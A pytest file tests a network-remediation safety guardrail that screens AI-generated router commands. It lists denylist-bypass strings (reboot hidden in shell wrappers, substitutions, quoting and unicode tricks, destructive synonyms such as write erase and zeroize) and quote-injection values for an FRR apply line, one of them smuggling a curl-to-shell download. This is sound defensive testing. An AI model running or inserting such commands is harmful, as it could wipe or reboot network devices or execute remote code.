"""SafetyGuardrail bypasses and the FRR apply line (v9CB17v5, 3Pc2ZVbJ). Every text here is synthetic."""

from __future__ import annotations

import shlex

import pytest

from ai_log_analyzer.remediation import (
    PlanInputError,
    RemediationGenerator,
    SafetyGuardrail,
    SafetyViolationError,
    VendorOS,
    screen_llm_cli,
)

pytestmark = pytest.mark.unit


# ── SafetyGuardrail: prefixes, operators, synonyms (v9CB17v5) ──────────────────────────────────────

GUARDRAIL_BYPASSES = [
    # Junos prefixes and the deactivate synonym
    "top delete protocols bgp", "up delete protocols bgp", "up 2 delete protocols bgp",
    "wildcard delete interfaces xe-*", "deactivate protocols bgp", "deact protocols bgp",
    "deactivate protocols bgp group X", "deactivate interfaces xe-0/0/1", "top deactivate routing-options",
    "set protocols bgp disable", "run request system reboot", "top request system reboot",
    # shell and vendor wrappers
    "bash sudo reboot", "run bash sudo reboot", "bash reboot", "sh -c reboot", "sh -lc reboot",
    "exec sudo reboot", "env reboot", "env FOO=1 reboot", "FOO=bar reboot", "command reboot",
    "nice -n 5 reboot", "timeout 5 reboot",
    "sudo -u root reboot", "sudo -- reboot", "time reboot", "busybox reboot", "eval reboot", "doas reboot",
    "xargs reboot", "setsid nohup reboot",
    "/sbin/reboot", "/usr/sbin/reboot now", "/sbin/shutdown -h now", "/bin/systemctl reboot", "./reboot",
    # unsplit shell operators
    "true | reboot", "show version | reboot", ": & reboot", "echo x&reboot", "echo x |reboot", "$(reboot)",
    "echo $(reboot)", "echo `reboot`", "`reboot`", "(reboot)", "{ reboot; }", "if true; then reboot; fi",
    "bash -c 'true | reboot'", "show x & write erase", "true | request system zeroize",
    "echo hi <(reboot)", "echo ${IFS}x;reboot",
    # quoting and unicode tricks
    '"reboot"', "'reboot'", "re''boot", 're""boot', "r\\eboot", "\\reboot", "ｒｅｂｏｏｔ",
    # synonyms the denylist already meant
    "no rou bgp 65000", "no router bgp 65000", "factory-reset all", "factory-reset", "erase all",
    "erase flash", "wr er", "top wr er",
]
GUARDRAIL_STILL_FINE = [
    "top show interfaces", "run show version", "show version | include reload", "show log | match reboot",
    "show system reboot", "show reload", "show version | include a;b|c", "clear ip bgp 10.0.0.1",
    "delete protocols bgp group UNDERLAY neighbor 10.0.0.1 import NETLOG-DRAIN-IN",
    "deactivate protocols bgp group UNDERLAY neighbor 10.0.0.1", "deactivate interfaces xe-0/0/1 unit 0",
    "set protocols bgp group X neighbor 10.0.0.1 disable", "set protocols bgp group X disable",
    "set interfaces xe-0/0/1 description \"uplink (reload test)\"", "description R&D link",
    "interface Ethernet1", " shutdown", "no shutdown", "no ip route 0.0.0.0/0",
    "no neighbor 10.0.0.1 shutdown",
    "set policy-options as-path X \"65000|65001\"", "neighbor 10.0.0.1 remote-as 65001",
    "commit confirmed 5 comment \"netlog-ai REM_X\"", "ip as-path access-list DRAIN permit .*",
    "bash show version", "env", "timeout", "top", "up", "run",
]


@pytest.mark.parametrize("cmd", GUARDRAIL_BYPASSES)
def test_guardrail_blocks_prefixed_synonym_and_operator_forms(cmd: str) -> None:
    assert SafetyGuardrail.violation(cmd), cmd
    with pytest.raises(SafetyViolationError):
        SafetyGuardrail.validate([cmd], 5)
    safe, blocked = SafetyGuardrail.screen([cmd])
    assert blocked and safe[0].startswith("# BLOCKED")
    assert screen_llm_cli({"frr": [cmd]})["frr"][0].startswith("# BLOCKED")


@pytest.mark.parametrize("cmd", GUARDRAIL_STILL_FINE)
def test_guardrail_leaves_targeted_commands_alone(cmd: str) -> None:
    assert SafetyGuardrail.violation(cmd) is None, cmd


@pytest.mark.parametrize("lines", [
    ["router bgp 65000", " shutdown"],
    ["router bgp 65000", "   shutdown"],
    ["router ospf 1", " shutdown"],
    ["router bgp 65000", " bgp log-neighbor-changes", " shutdown"],
    ["no logging x", "router bgp 1", "\tshutdown"],
])
def test_shutdown_directly_under_a_routing_process_is_blocked(lines: list[str]) -> None:
    assert SafetyGuardrail.violation("\n".join(lines))
    with pytest.raises(SafetyViolationError):
        SafetyGuardrail.validate(lines, 5)
    with pytest.raises(SafetyViolationError):
        RemediationGenerator().build_custom_safe_plan("r1", VendorOS.ARISTA_EOS, lines, [], [], "x")
    safe, blocked = SafetyGuardrail.screen(lines)
    assert len(blocked) == 1 and blocked[0]["command"].strip() == "shutdown"
    assert safe[:-1] == lines[:-1] if lines[-1].strip() == "shutdown" else True
    assert [s for s in screen_llm_cli(lines) if s.startswith("# BLOCKED")]


@pytest.mark.parametrize("lines", [
    ["router bgp 65000", " neighbor 10.0.0.1", "  shutdown"],
    ["router bgp 65000", " neighbor 10.0.0.1 shutdown"],
    ["router bgp 65000", " address-family ipv4", "  neighbor 10.0.0.1 activate"],
    ["router bgp 65000", " neighbor 10.0.0.1 remote-as 65001", "interface Ethernet1", " shutdown"],
    ["interface Ethernet1", " shutdown"],
    ["router bgp 65000", "interface Ethernet1", " shutdown"],
])
def test_per_neighbor_and_interface_shutdown_stay_allowed(lines: list[str]) -> None:
    assert SafetyGuardrail.violation("\n".join(lines)) is None
    SafetyGuardrail.validate(lines, 5)
    assert SafetyGuardrail.screen(lines)[1] == []


def test_read_only_checks_reject_background_and_process_substitution() -> None:
    for check in ("show version & ls", "show version &ls", "show version <(id)", "show version & reload"):
        assert SafetyGuardrail.read_only_violation(check), check
    for check in ("show interfaces Et1 | include error", 'show interfaces x | match "a|b"', "ping 192.0.2.1"):
        assert SafetyGuardrail.read_only_violation(check) is None, check


def test_custom_plan_card_says_the_commands_are_not_template_vetted() -> None:
    plan = RemediationGenerator().build_custom_safe_plan("r1", VendorOS.ARISTA_EOS, ["interface Ethernet1"],
                                                         [], [], "x")
    assert "Review required" in plan.to_markdown_card()
    drain = RemediationGenerator().build_graceful_link_drain("r1", VendorOS.ARISTA_EOS, "Ethernet1")
    assert "Review required" not in drain.to_markdown_card()


# ── FRR card: the apply line must not be breakable (3Pc2ZVbJ) ──────────────────────────────────────

QUOTE_CMDS = [
    "description it's a link",
    "description a'b $(id) ; echo hi",
    "description `id` $HOME \"q\" \\ x",
    "router bgp 65000' ; curl http://192.0.2.1/a.sh|sh ; echo '",
]


def _frr_plan(cmds: list[str]):
    return RemediationGenerator().build_custom_safe_plan("frr1", VendorOS.FRR, cmds, [], [], "x")


@pytest.mark.parametrize("cmds", [[c] for c in QUOTE_CMDS] + [QUOTE_CMDS])
def test_frr_apply_line_passes_each_command_as_one_argument(cmds: list[str]) -> None:
    try:
        plan = _frr_plan(cmds)
    except SafetyViolationError:
        return  # refusing is also acceptable
    argv = shlex.split(plan.config_commands[1])
    assert argv == ["vtysh", "-c", "configure terminal", *[a for c in cmds for a in ("-c", c)]]


@pytest.mark.parametrize("cmd", ["x' & reboot & echo '", "x'; reboot; echo '", "x' | reboot | echo '",
                                 "x' $(reboot) '"])
def test_frr_custom_command_hiding_a_blocked_verb_behind_quotes_is_refused(cmd: str) -> None:
    with pytest.raises(SafetyViolationError):
        _frr_plan([cmd])


@pytest.mark.parametrize("vendor", list(VendorOS))
@pytest.mark.parametrize("cmd", ["a\nb", "a\rb", "a\x00b", "a\x1bb", "a b", "a\x85b"])
def test_custom_commands_with_line_breaks_or_control_characters_are_refused(
        vendor: VendorOS, cmd: str) -> None:
    with pytest.raises(PlanInputError, match="line break or control character"):
        RemediationGenerator().build_custom_safe_plan("r1", vendor, [cmd], [], [], "x")


def test_custom_commands_may_still_contain_tabs_and_quotes() -> None:
    plan = RemediationGenerator().build_custom_safe_plan("r1", VendorOS.ARISTA_EOS,
                                                         ["description a\tb 'c'"], [], [], "x")
    assert plan.body_commands == ["description a\tb 'c'"]


def test_builtin_frr_plans_keep_their_readable_apply_line() -> None:
    plan = RemediationGenerator().build_graceful_link_drain("frr1", VendorOS.FRR, "eth1")
    assert plan.config_commands[1] == "vtysh -c 'configure terminal' -c 'interface eth1' -c ' shutdown'"
